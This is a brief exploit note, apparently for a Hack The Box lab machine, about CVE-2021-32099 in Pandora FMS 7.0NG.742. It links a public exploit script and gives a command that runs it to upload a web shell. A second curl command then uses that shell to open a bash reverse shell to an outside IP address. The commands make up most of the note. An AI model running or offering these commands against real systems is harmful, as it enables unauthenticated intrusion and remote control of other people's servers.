___
The _all-in-one flexible monitoring solution_ that covers networks, servers, applications, UX, distributed environments and more

# CVE-2021-32099 Pandora_v7.0NG.742

https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/


https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py

```bash
python3 sqlpwn.py -t pandora.panda.htb:8080 -f shell.php
```

```bash
curl 'http://pandora.panda.htb:8080/pandora_console/images/shell.php?test=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.21/443+0>%261"'
```
